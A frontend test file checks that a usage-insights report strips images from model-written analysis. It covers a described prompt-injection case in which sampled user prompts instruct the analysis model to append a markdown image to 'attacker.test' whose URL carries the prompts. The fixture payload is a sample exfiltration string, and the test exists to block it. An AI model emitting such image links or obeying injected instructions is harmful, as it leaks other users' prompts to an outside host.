// @vitest-environment jsdom
import '@testing-library/jest-dom/vitest';
import { cleanup, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';

import { UsageInsightsReport } from './UsageInsightsReport';

afterEach(cleanup);

function report(analysis: string) {
  return {
    analysis,
    model: 'analysis-model',
    sampled_requests: 3,
    scope: 'all users',
    generated_at: '2026-11-06T12:00:00Z',
  };
}

describe('UsageInsightsReport', () => {
  // The analysis is model output written from other users' sampled prompts. A
  // prompt can tell the model to end with an image whose URL carries the
  // prompts; rendered as an image, the admin's browser would send it on sight.
  it('never loads an image the analysis contains', () => {
    const { container } = render(
      <UsageInsightsReport
        result={report('## Themes\n\nMostly code. ![](https://attacker.test/x.gif?d=prompts)')}
      />,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(
      screen.getByRole('link', { name: 'https://attacker.test/x.gif?d=prompts' }),
    ).toHaveAttribute('href', 'https://attacker.test/x.gif?d=prompts');
    expect(screen.getByText('Themes').tagName).toBe('H2');
  });
});
